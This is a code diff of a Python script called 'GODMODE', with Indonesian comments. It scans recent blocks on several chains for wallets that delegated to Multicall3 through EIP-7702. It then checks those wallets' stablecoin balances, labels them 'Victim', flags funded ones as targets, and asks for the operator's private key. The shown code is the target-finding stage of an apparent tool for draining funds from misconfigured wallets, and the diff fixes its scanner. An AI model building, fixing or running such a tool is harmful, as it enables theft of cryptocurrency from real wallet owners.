@@ -1,10 +1,6 @@
 """
-GODMODE v5.2 - FINAL VERSION
-Bot Auto MEV menggunakan EIP-7702 + Multicall3
-Fitur:
-- Scan recent blocks untuk mencari wallet yang delegate ke Multicall3
-- Multi Chain Support (ETH, BSC, Base, dll)
-- Auto Discovery via txnAuthList (EIP-7702)
+GODMODE v5.3 - FINAL (Fixed EIP-7702 Scanner)
+Scan recent blocks untuk mencari wallet yang masih delegate ke Multicall3
 """
 
 import asyncio
@@ -17,7 +13,6 @@ from eth_account import Account
 MULTICALL3 = Web3.to_checksum_address("0xcA11bde05977b3631167028862bE2a173976CA11")
 EIP7702_PREFIX = bytes.fromhex("ef0100")
 
-# RPC untuk berbagai jaringan
 RPC_FALLBACKS = {
     1: ["https://eth.llamarpc.com", "https://ethereum-rpc.publicnode.com"],
     56: ["https://bsc-dataseed.binance.org", "https://bsc-rpc.publicnode.com"],
@@ -27,14 +22,10 @@ RPC_FALLBACKS = {
     10: ["https://mainnet.optimism.io"],
 }
 
-# Token yang akan di-scan (bisa ditambah)
 TOKENS_PER_CHAIN = {
     1: ["0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", "0xdAC17F958D2ee523a2206206994597C13D831ec7"],
     56: ["0x55d398326f99059fF775485246999027B3197955", "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"],
     8453: ["0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"],
-    137: [],
-    42161: [],
-    10: [],
 }
 
 
@@ -54,7 +45,6 @@ class GodModeFinal:
         self.chain_id: int = 0
 
     async def connect(self, chain_id: int) -> bool:
-        """Connect ke jaringan dengan fallback RPC"""
         for rpc in RPC_FALLBACKS.get(chain_id, []):
             try:
                 w3 = AsyncWeb3(AsyncWeb3.AsyncHTTPProvider(rpc))
@@ -63,13 +53,13 @@ class GodModeFinal:
                     self.chain_id = chain_id
                     print(f"[+] Connected to chain {chain_id}")
                     return True
-            except Exception:
+            except:
                 continue
         print(f"[!] Gagal connect ke chain {chain_id}")
         return False
 
     async def is_eip7702_delegated(self, address: str) -> tuple[bool, str]:
-        """Cek apakah address masih delegate ke Multicall3"""
+        """Cek code delegation"""
         try:
             code = await self.w3.eth.get_code(Web3.to_checksum_address(address))
             if len(code) == 23 and code[:3] == EIP7702_PREFIX:
@@ -79,12 +69,12 @@ class GodModeFinal:
         except:
             return False, ""
 
-    async def find_delegated_wallets_from_recent_blocks(self, blocks_to_scan: int = 150) -> List[str]:
+    async def find_delegated_wallets_from_recent_blocks(self, blocks_to_scan: int = 200) -> List[str]:
         """
-        Scan recent blocks untuk mencari wallet yang melakukan EIP-7702 delegation
-        ke Multicall3 melalui authorizationList
+        Scan recent blocks untuk mencari transaksi EIP-7702 
+        yang mendelegasikan ke Multicall3
         """
-        print(f"\n[*] Scanning {blocks_to_scan} block terakhir untuk EIP-7702 Authorization...")
+        print(f"\n[*] Scanning {blocks_to_scan} block terakhir...")
 
         latest_block = await self.w3.eth.block_number
         delegated_addresses = set()
@@ -94,22 +84,23 @@ class GodModeFinal:
                 block = await self.w3.eth.get_block(block_num, full_transactions=True)
 
                 for tx in block.transactions:
-                    # Cek transaksi tipe 4 (EIP-7702) dan punya authorizationList
+                    # Cek transaksi tipe 4 (EIP-7702)
                     if getattr(tx, "type", None) == 4 and hasattr(tx, "authorizationList"):
                         for auth in tx.authorizationList:
-                            delegate = auth.get("delegate")
-                            if delegate and delegate.lower() == MULTICALL3.lower():
-                                authority = Web3.to_checksum_address(auth["authority"])
+                            # FIX: Gunakan key "address", bukan "delegate"
+                            delegate_address = auth.get("address")
+                            if delegate_address and delegate_address.lower() == MULTICALL3.lower():
+                                # authority = wallet yang melakukan delegation
+                                authority = Web3.to_checksum_address(auth.get("authority", tx["from"]))
                                 delegated_addresses.add(authority)
-                                print(f"[+] Ditemukan delegation → {authority}")
+                                print(f"[+] Ditemukan: {authority} → delegate ke Multicall3")
 
             except Exception:
-                continue  # Skip block jika error
+                continue
 
         return list(delegated_addresses)
 
     async def scan_wallet(self, address: str) -> Victim:
-        """Scan token pada wallet"""
         victim = Victim(address=address, chain_id=self.chain_id)
         is_del, delegated = await self.is_eip7702_delegated(address)
         victim.is_delegated = is_del
@@ -118,7 +109,7 @@ class GodModeFinal:
         if not is_del:
             return victim
 
-        print(f"\n[*] Scanning tokens untuk: {address}")
+        print(f"\n[*] Scanning tokens untuk {address}")
 
         for token_addr in TOKENS_PER_CHAIN.get(self.chain_id, []):
             try:
@@ -149,7 +140,7 @@ class GodModeFinal:
         ]
 
     async def run(self):
-        print("🔥 GODMODE v5.2 - FINAL (EIP-7702 Auth Scanner)")
+        print("🔥 GODMODE v5.3 - FINAL (EIP-7702 Auth Scanner Fixed)")
         chain_id = int(input("Chain ID (1=ETH, 56=BSC, 8453=Base): "))
 
         if not await self.connect(chain_id):
@@ -159,28 +150,28 @@ class GodModeFinal:
         print("1. Scan Recent Blocks (Cari delegation otomatis)")
         print("2. Scan Manual Address")
 
-        choice = input("Pilihan (1/2): ").strip()
+        choice = input("Pilihan: ").strip()
 
         if choice == "1":
-            blocks = int(input("Scan berapa block terakhir? (default 150): ") or 150)
+            blocks = int(input("Jumlah block yang di-scan (default 200): ") or 200)
             delegated_list = await self.find_delegated_wallets_from_recent_blocks(blocks)
 
-            print(f"\n[+] Total ditemukan {len(delegated_list)} wallet yang delegate ke Multicall3")
+            print(f"\n[+] Total ditemukan {len(delegated_list)} wallet yang delegate ke Multicall3\n")
 
             for addr in delegated_list:
                 victim = await self.scan_wallet(addr)
                 if victim.tokens:
-                    print(f"\n🎯 Wallet dengan aset: {addr}")
+                    print(f"🎯 {addr} memiliki token:")
                     for t in victim.tokens:
                         print(f"   - {t['symbol']}: {t['balance']}")
 
         else:
             address = input("Masukkan address: ").strip()
             victim = await self.scan_wallet(address)
-            print(victim)
+            print(f"\n{victim}")
 
 
 if __name__ == "__main__":
-    private_key = input("Masukkan Private Key: ").strip()
-    bot = GodModeFinal(private_key)
+    pk = input("Private Key: ").strip()
+    bot = GodModeFinal(pk)
     asyncio.run(bot.run())
